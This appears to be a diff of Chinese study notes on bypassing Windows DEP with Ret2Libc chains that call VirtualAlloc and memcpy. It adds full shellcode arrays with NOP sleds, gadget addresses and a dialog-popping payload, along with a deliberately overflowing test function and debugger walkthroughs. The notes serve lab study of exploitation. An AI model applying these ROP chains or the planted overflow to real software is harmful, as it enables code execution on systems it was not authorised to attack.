@@ -644,35 +644,83 @@ LPVOID WINAPI VirtualAlloc(
 #include<string.h>
 #include<stdio.h>
 #include<windows.h>
-charshellcode[]=
-    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
-    "……"
+char shellcode[]=
     "\x90\x90\x90\x90"
-    "\xBA\xD9\xBB\x7C"//修正 EBP retn 4
-    "\xBC\x45\x82\x7C"//申请空间
     "\x90\x90\x90\x90"
-    "\xFF\xFF\xFF\xFF"//-1 当前进程
-    "\x00\x00\x03\x00"//申请空间起始地址
-    "\xFF\x00\x00\x00"//申请空间大小
-    "\x00\x10\x00\x00"//申请类型
-    "\x40\x00\x00\x00"//申请空间访问类型
     "\x90\x90\x90\x90"
-    "\x8A\x17\x84\x7C"//pop eax retn 
-    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
-    "\x0B\x1A\xBF\x7C"//pop pop retn
-    "\xBA\xD9\xBB\x7C"//修正 EBP retn4
-    "\x5F\x78\xA6\x7C"//pop retn
-    "\x00\x00\x03\x00"//可执行内存空间地址，转入执行用
-    "\x00\x00\x03\x00"//可执行内存空间地址，复制用
-    "\xBF\x7D\xC9\x77"//push esp jmp eax && 原始 shellcode 起始地址
-    "\xFF\x00\x00\x00"//shellcode 长度
-    "\xAC\xAF\x94\x7C"//memcpy
-    "\x00\x00\x03\x00"//一个可以读地址
-    "\x00\x00\x03\x00"//一个可以读地址
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\xBA\xD9\xBB\x7C"//address of PUSH ESP POP EBP RETN 4 
+    "\xBC\x45\x82\x7C"//address of call VirtualAllocEx
+    "\x90\x90\x90\x90"//
+    "\xFF\xFF\xFF\xFF"//hProcess = -1 ,-1 stands for current process
+    "\x00\x00\x03\x00"//lpAddress = 00030000
+    "\xFF\x00\x00\x00"//dwSize= 0xff
+    "\x00\x10\x00\x00"//flAllocationType = 0x1000
+    "\x40\x00\x00\x00"//flProtect = 0x40,stands for exec_read_write
+    "\x90\x90\x90\x90"
+    "\x8A\x17\x84\x7C"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x0B\x1A\xBF\x7C"
+    "\xBA\xD9\xBB\x7C"
+    "\x5F\x78\xA6\x7C"
+    "\x00\x00\x03\x00"
+    "\x00\x00\x03\x00"
+    "\xBF\x7D\xC9\x77"
+    "\xFF\x00\x00\x00"
+    "\xAC\xAF\x94\x7C"//address of  in ntdll.memcpy 
+    "\x00\x00\x03\x00"
+    "\x00\x00\x03\x00"
     "\x00\x90\x90\x94"
-    "\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C"
-    "……"
-    "\x53\xFF\x57\xFC\x53\xFF\x57\xF8"
+    "\xFC\x68\x6A\x0A"
+    "\x38\x1E\x68\x63"
+    "\x89\xD1\x4F\x68"
+    "\x32\x74\x91\x0C"
+    "\x53\xFF\x57\xFC"
+    "\x53\xFF\x57\xF8"
     ;
 
 void test()
@@ -721,18 +769,67 @@ int main()
 由于EBP在溢出过程中被破坏，所以第一步依然是修复EBP，我们用```PUSH ESP POP EBP RETN4```指令的地址覆盖test函数的返回地址，然后按照以上参数布置一个能够申请可执行内存空间的shellcode，shellcode如下所示：
 
 ```c
-char shellcode [] = "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
-"……"
-"\x90\x90\x90\x90"
-"\xBA\xD9\xBB\x7C"//修正 EBP retn 4 的指令地址
-"\xBC\x45\x82\x7C"//CALL VirtualAllocEx 地址
-"\x90\x90\x90\x90"
-"\xFF\xFF\xFF\xFF"//-1 当前进程
-"\x00\x00\x03\x00"//申请空间起始地址 0x00030000
-"\xFF\x00\x00\x00"//申请空间大小 0xFF
-"\x00\x10\x00\x00"//申请类型 0x1000
-"\x40\x00\x00\x00"//申请空间访问类型 0x40
-; 
+char shellcode [] = 
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\xBA\xD9\xBB\x7C"//address of PUSH ESP POP EBP RETN 4 
+    "\xBC\x45\x82\x7C"//address of call VirtualAllocEx
+    "\x90\x90\x90\x90"//
+    "\xFF\xFF\xFF\xFF"//hProcess = -1 ,-1 stands for current process
+    "\x00\x00\x03\x00"//lpAddress = 00030000
+    "\xFF\x00\x00\x00"//dwSize= 0xff
+    "\x00\x10\x00\x00"//flAllocationType = 0x1000
+    "\x40\x00\x00\x00"//flProtect = 0x40,stands for exec_read_write
+    "\x90\x90\x90\x90"
+    "\xFF\xFF\xFF\xFF"//-1 当前进程
+    "\x00\x00\x03\x00"//申请空间起始地址 0x00030000
+    "\xFF\x00\x00\x00"//申请空间大小 0xFF
+    "\x00\x10\x00\x00"//申请类型 0x1000
+    "\x40\x00\x00\x00"//申请空间访问类型 0x40
+    ; 
 ```
 
 编译好程序后用 OllyDbg 加载程序，并在 0x7CBBD9BA（调整 EBP 入口）处下断点，然后按 F8 键单步运行到 0x7C8245C2（VirtualAlloc 函数的 RETN 0x10）暂停，观察内存状态。
@@ -741,3 +838,364 @@ char shellcode [] = "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x9
 
 <img src="images/09/virtualAlloc函数返回前内存状态.png" >
 
+开辟了可执行空间后，接下来要将我们的shellcode中的一部分利用内存中已有的memcpy()复制到这个可执行空间去。
+
+大家知道 memcpy 函数位于 ntdll.dll，需要三个参数，依次为目的内存起始地址、源内存起始地址、复制长度，其中目的内存起始地址和复制长度都可以直接写在 shellcode 中，唯一的
+难点在于对源内存起始地址的确定。
+
+实际上我们不需要精确的定位，只要保证源内存起始地址在 shellcode 中关键代码的前边即可，因此可以使用 ```PUSH ESP JMP EAX``` 指令来填充这个参数。
+
+如何布置 EAX 想必大家都已经很熟悉，而关于 EAX 具体指向什么指令我们暂时先不讨论。另外一个需要注意的问题，在空间申请后EBP被设置成 0x00000000，而后边我们还会再用到 EBP，所以还需要修复 EBP。最后还需要注意 VirtualAlloc 函数返回时带有 16（0x10）个字节的偏移，要在 shellcode 中要添加相应的填充。shellcode 如下所示。
+
+> 就我的实验环境下，```ret 10```执行后，esp=0012fee8,那么[0012fee8]中应当布置一个可执行指令的地址。
+
+```c
+char shellcode [] = 
+      "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\xBA\xD9\xBB\x7C"//address of PUSH ESP POP EBP RETN 4 
+    "\xBC\x45\x82\x7C"//address of call VirtualAllocEx
+    "\x90\x90\x90\x90"//
+    "\xFF\xFF\xFF\xFF"//hProcess = -1 ,-1 stands for current process
+    "\x00\x00\x03\x00"//lpAddress = 00030000
+    "\xFF\x00\x00\x00"//dwSize= 0xff
+    "\x00\x10\x00\x00"//flAllocationType = 0x1000
+    "\x40\x00\x00\x00"//flProtect = 0x40,stands for exec_read_write
+    "\x90\x90\x90\x90"
+    "\x8A\x17\x84\x7c"//=[0012fed4] address of pop eax ret
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90" // 这个位置是VirtualAlloc 调用后ret 10返回后esp指向的位置，也是pop eax指令赋给eax的内容.
+    "\xBA\xD9\xBB\x7C" // EBP之前被破坏，现在调整EBP值（现在为90909090，应当使其为esp或相近值） address of PUSH ESP POP EBP RET 4
+    ; 
+```
+
+重新编译程序后用 OllyDbg 加载程序，并在 0x7CBBD9BA（调整 EBP 入口）处下断点，然后单步运行到第二次调整完 EBP，然后在返回前暂停，观察内存状态。
+如图 12.3.27 所示，修正 EBP 后 ESP 和 EBP 指向同一个位置，而 memcpy 中的源内存地址参数位于 EBP+0x0C，如果我们希望使用 PUSH ESP 的方式设置源内存地址，就需要让 ESP 指向 EBP+0x10，这样执行完 PUSH 操作后 ESP 的值刚好放在 EBP+0x0C。为了达到这个目的有两个问题需要解决：
+- ESP 如何指向 EBP+0x10 ?
+- PUSH ESP 操作后程序控制权如何回收?
+
+> 说明：这里memcpy函数调用和之前Call virtualAlloc不同，这里设置参数的方式是按下图中的方式传入，即当前EBP+8,EBP+10,EBP+c这3个。
+
+
+<img src="images/09/第二次调整ebp后内存状态.png">
+
+先来解决第一个问题，目前 ESP 指向 EBP 的位置，在执行完 RETN 0x4 指令之后 ESP 指向 EBP+0x8 的位置，此时只需要类似 POP RETN 的指令就以在执行完 RETN 后让 ESP 指向 EBP+0x10。我们就在当前 EBP 的位置放置一条类似 ```POP RETN``` 的指令，本次实验中选择``` POP ECX RET```使ESP再次+0x8，指令地址为 0x7CA6785F。
+
+
+再来分析第二个问题，在执行完 PUSH 操作后收回程序控制权的最佳位置在 EBP+0x14，因为在这个位置执行 RETN 指令既保证了 memcpy 参数不被破坏，又可以减小 shellcode 长度。故在执行完 PUSH 操作后我们只需要 POP 两次就可以让 ESP 指向 EBP+0x14，所以 JMP EAX 指令中的 EAX 只要指向类似 POP POP RETN 指令即可。然后在 EBP+0x14 位置放置 memcpy
+函数的切入点 0x7C94AFAC（```MOV ESI,DWORD PTR SS:[EBP+C]```），这样程序在执行类似 ```POP POP RETN``` 指令中 RETN 时就可以转入 memcpy 函数中执行复制操作了。
+
+我们按照以上分析和 memcpy 对参数的要求来布置 shellcode，代码如下所示。
+
+```c
+char shellcode [] = 
+      "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\xBA\xD9\xBB\x7C"//address of PUSH ESP POP EBP RETN 4 
+    "\xBC\x45\x82\x7C"//address of call VirtualAllocEx
+    "\x90\x90\x90\x90"//
+    "\xFF\xFF\xFF\xFF"//hProcess = -1 ,-1 stands for current process
+    "\x00\x00\x03\x00"//lpAddress = 00030000
+    "\xFF\x00\x00\x00"//dwSize= 0xff
+    "\x00\x10\x00\x00"//flAllocationType = 0x1000
+    "\x40\x00\x00\x00"//flProtect = 0x40,stands for exec_read_write
+    "\x90\x90\x90\x90"
+    "\x8A\x17\x84\x7c"//=[0012fed4] address of pop eax ret
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x0B\x1A\xBF\x7C" // 这个位置是VirtualAlloc 调用后ret 10返回后esp指向的位置，也是pop eax指令赋给eax的内容.
+    "\xBA\xD9\xBB\x7C" // EBP之前被破坏，现在调整EBP值（现在为90909090，应当使其为esp或相近值） address of PUSH ESP POP EBP RET 4
+    "\x5F\x78\xA6\x7C"//address of pop ecx retn
+    "\x90\x90\x90\x90"
+    "\x00\x00\x03\x00"//可执行内存空间地址,memcpy目标地址
+    "\xBF\x7D\xC9\x77"//push esp jmp eax && 原始 shellcode 起始地址
+    "\xFF\x00\x00\x00"//shellcode 长度
+    "\xAC\xAF\x94\x7C"//memcpy 函数切入点; 
+    ; 
+```
+
+重新编译程序后用 OllyDbg 加载程序，并在 0x7CBBD9BA（调整 EBP 入口）处下断点，然后按 F8 键单步运行到 memcpy 函数复制结束返回前暂停，观察内存状态。
+
+如图 12.3.28 所示，执行完复制操作后，memcpy 函数在返回时 ESP 指向了我们 shellcode 中的某个位置，幸运的是这个位置还没有被占用，只是放置了填充字符。通过它周围的数据我们可以判断出这个位置位于 shellcode 中 ```POP POP RETN``` 指令地址和 memcpy 参数之间，并且紧挨着 memcpy 第一个参数，所以这个位置就很容易确定了，只要在这个位置填上申请的可执行内存空间起始地址，就可以转入该内存区域执行了。
+
+<img src="images/09/memcpy函数返回前内存状态.png">
+
+我们似乎还没有放置弹出对话框的机器码。通过图 12.3.28 中 memcpy 参数可以看出，复制操作的源内存起始地址为 0x0012FF00，这个位置也是 memcpy 函数的复制长度参数所在位置，所以只要在它后边放置对话框的机器码即可。按照以上分析重新布置一个完整的 shellcode，对于其中的一些填充我们稍后解释说明，如图 12.3.29 
+
+<img src="images/09/利用VirtualAlloc申请可以执行内存绕过DEP的shellcode布局.png">
+
+```c
+char shellcode [] = 
+      "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\xBA\xD9\xBB\x7C"//address of PUSH ESP POP EBP RETN 4 
+    "\xBC\x45\x82\x7C"//address of call VirtualAllocEx
+    "\x90\x90\x90\x90"//
+    "\xFF\xFF\xFF\xFF"//hProcess = -1 ,-1 stands for current process
+    "\x00\x00\x03\x00"//lpAddress = 00030000
+    "\xFF\x00\x00\x00"//dwSize= 0xff
+    "\x00\x10\x00\x00"//flAllocationType = 0x1000
+    "\x40\x00\x00\x00"//flProtect = 0x40,stands for exec_read_write
+    "\x90\x90\x90\x90"
+    "\x8A\x17\x84\x7c"//=[0012fed4] address of pop eax ret
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x0B\x1A\xBF\x7C" // 这个位置是VirtualAlloc 调用后ret 10返回后esp指向的位置，也是pop eax指令赋给eax的内容.
+    "\xBA\xD9\xBB\x7C" // EBP之前被破坏，现在调整EBP值（现在为90909090，应当使其为esp或相近值） address of PUSH ESP POP EBP RET 4
+    "\x5F\x78\xA6\x7C"//address of pop ecx retn
+    "\x00\x00\x03\x00"// 这里是下面memcpy执行返回前esp所执向，所以安排可执行地址00030000,也可以根据实际shellcode位置进行更精确定位
+    "\x00\x00\x03\x00"//可执行内存空间地址,memcpy目标地址
+    "\xBF\x7D\xC9\x77"//push esp jmp eax && 原始 shellcode 起始地址
+    "\xFF\x00\x00\x00"//shellcode 长度
+    "\xAC\xAF\x94\x7C"//memcpy 函数切入点; 
+    "\x00\x00\x03\x00"//???????
+    "\x00\x00\x03\x00"//???????
+    "\x00\x90\x90\x94"
+    "\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C"
+    "\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53"
+    "\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B"
+    "\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95" 
+    "\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59"
+    "\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A"
+    "\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75"
+    "\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03"
+    "\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB"
+    "\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50"
+    "\x53\xFF\x57\xFC\x53\xFF\x57\xF8"
+    ;
+```
+
+重新编译程序后用 OllyDbg 加载程序，并在 0x7CBBD9BA（调整 EBP 入口）处下断点，然后按 F8 键单步运行进入 0x00030000 内存空间执行后暂停，观察内存状态。
+
+如图 12.3.30 所示，memcpy 函数复制过来的不只是弹出对话框的机器码，还包含着弹出对话框机器码前面的一些指令和参数，而这些东西会破坏程序的执行，所以我们要想办法搞定它们。
+
+<img src="images/09/转入0x00030000执行.png">
+
+首先是对 ESI 和 EDI 指向内存的操作，在 0x00030004 和 x00030005 分别对 ESI 和 EDI 指向的内存有读取操作，我们需要保证 ESI 和 EDI 指向合法的位置。ESI 和 EDI 是在 memcpy 函数返回前被 POP 进去的（如图 12.3.28 所示），这也是为什么在 shellcode 中 memcpy 函数切
+入点下边我们没有使用 0x90 填充而使用两个 0x00030000 填充。
+接下来是 0x00030006 的 XCHG EAX,EBP 指令，这条指令直接破坏了 ESP，而在弹出对话框的机器码中有 PUSH 操作，所以 ESP 要修复，故我们在弹出对话框的机器码前边使用 0x94填充，在 0x00030013 处来修复这个问题。
+
+最后是 0x0003000F 的对[EAX]操作，如果 0x00030010 处使用 0x90 填充，结果就是对[EAX+0x909094FC]操作，这会引发异常，所以我们使用 0x00 填充 0x00030010，避免出现异常。现在大家应该明白 shellcode 中那些特殊的填充了吧。
+
+>题外话：实际上我们有种更简单的方法来处理掉这些垃圾指令，从图 12.3.30 中大家可以看到我们弹出对话框的机器码起始地址为 0x00030014，我们在可以让 memcpy 函数返回时直接跳转到这个位置，跃过前边的垃圾指令。在这我们之所以使用复杂的方法，是为了给大家介绍在一些特殊情况下 shellcode 的特殊处理思路。
+
+
+## 利用可执行内存挑战DEP
+
+有时，在进程的内存空间中会存在一段可读可写可执行的内存。使用OllyDbg等调试工具的内存窗口的“Access”列可以看到如“RWE”，即表示可读可写可执行。
+
+如果我们能够将 shellcode 复制到这段内存中，并劫持程序流程，我们的 shellcode 就有执行的机会。
+
+这种方法的实现难度要比前面三种方法小的多，不需要费尽心思地设置内存属性、申请可执行的内存空间……这里所需要的是一点点运气：假使被攻击的程序内存空间中存在这样一个可执行的数据区域，就可以直接通过 memcpy 函数将 shellcode 复制到这段内存区域中执行。我们通过以下代码来分析这种绕过 DEP 的方法。
+
+```c
+#include<stdlib.h>
+#include<string.h>
+#include<stdio.h>
+#include<windows.h>
+char shellcode[]=
+    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+    //"……"
+    "\x90\x90\x90\x90"
+    "\x8A\x17\x84\x7C"//pop eax retn
+    "\x0B\x1A\xBF\x7C"//pop pop retn
+    "\xBA\xD9\xBB\x7C"//修正 EBP retn 4
+    "\x5F\x78\xA6\x7C"//pop retn
+    "\x08\x00\x14\x00"//可执行内存中弹出对话框机器码的起始地址
+    "\x00\x00\x14\x00"//可执行内存空间地址，复制用
+    "\xBF\x7D\xC9\x77"//push esp jmp eax && 原始 shellcode 起始地址.eax 当前应为shellcode起始位置（自test函数调用后未变），所以一旦jmp eax，则跳转回此段shellcode最前端，这会触发DEP异常。所以在修正EBP之前要修正eax为可执行内存地址。
+    "\xFF\x00\x00\x00"//shellcode 长度
+    "\xAC\xAF\x94\x7C"//memcpy
+    "\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C"
+    //"……"
+    "\x53\xFF\x57\xFC\x53\xFF\x57\xF8"
+    ;
+void test()
+{
+    chartt[176];
+    memcpy(tt,shellcode,450);
+}
+int main()
+{
+    HINSTANCE hInst = LoadLibrary("shell32.dll");
+    char temp[200];
+    test();
+    return 0;
+} 
+```
+
+对实验思路和代码简要解释如下:
+
+- 为了更直观的反映绕过 DEP 的过程，我们在本次实验中不启用 GS 和 SafeSEH。
+- 函数 test 存在一个典型的溢出，通过向 str 复制超长字符串造成 str 溢出，进而覆盖函数返回地址。
+- 覆盖掉函数返回地址后，通过 Ret2Libc 技术，利用 memcpy 函数将 shellcode 复制到内存中的可读可写可执行区域。
+- 最后在这段可执行的内存空间中执行 shellcode，实现 DEP 的绕过。
+
+
+实验环境如下:
+- 操作系统 Windows 2003 SP2
+- DEP 状态 Optout
+- 编译器 VC++ 6.0
+- 编译选项 禁用优化选项
+- build 版本 release 版本
+
+通过下图可以看到，在 0x00140000 的位置存在一段可读可写可执行的内存，长度为0x1000，足够放置我们的 shellcode。本次实验的核心就是利用 memcpy 函数完成 shellcode 的复制，通过上个实验的介绍大家对如何布置 memcpy 所需要的参数应该很熟悉了，现在让我们再来布置一次。
+
+- 最开始是复制的目的内存起始地址，本次实验时我们使用 0x00140000。
+- 接下来是源内存起始地址，我们先用 PUSH ESP JMP EAX 指令的地址来填充，待执行完 PUSH ESP 操作后这个位置会覆盖为当前 ESP 的值，以实现源内存起始地址的动态获取。
+- 最后是复制的字符串长度，只要能将关键的指令代码都复制过去即可，本次实验我们使用 0xFF。
+- 再加上 JMP EAX 中 EAX 值的设置和 EBP 的修正，我们的shellcode 如下所示。
+
+
+
+<img src="images/09/可读可写可执行的内存区域.png">
+
+细心的读者会发现虽然都是利用 memcpy 函数复制 shellcode，但是本次实验的 shellcode 布局和上一个实验中不大一样，这个问题稍后解释。我们先来编译程序，编译好程序后用 OllyDbg 加载程序，并在 0x7CBBD9BA（调整 EBP 入口）处下断点，待程序中断后单步执行程序，在程序进入 0x00140000 执行后暂停程序，观察一下周围的情况。
+
+<img src="images/09/转入0x00140000执行.png">
+
+如图 12.4.2，现在我们已经成功转入 0x00140000 执行了，大家会发现这次复制依然带来了很多垃圾代码，上个实验中为了向大家介绍一些特殊情况下的 shellcode 布局技巧，对垃圾代码做了修补操作。这次我们使用一种更为简单的处理方法：直接无视前边这一堆垃圾代码，在memcpy 复制结束后直接转到弹出对话框的机器码中执行，跃过前边的垃圾代码。
+
+从图 12.4.2 中可以看到弹出对话框的机器码起始地址为 0x00140008，所以我们就用 0x00140008 代替 0x00140000 作为 memcpy 复制结束后的转入地址，这样就可以越过前面那堆垃圾代码，直接运行核心机器码了。我们 shellcode 的最终布局如图 12.4.3 所示。
+
+<img src="images/09/利用可执行内存绕过DEP的shellcode布局.png">
+
+重新编译程序后直接运行，大家就可以看到弹出的对话框了.
+
+> 个人实验，没有能够执行，原因是0x00140000为不可执行内存。从ollydbg观察此内存访问属性为RWE，使用xdbg32查看，0x00140000仅可读写。所以执行时会引发nt异常。
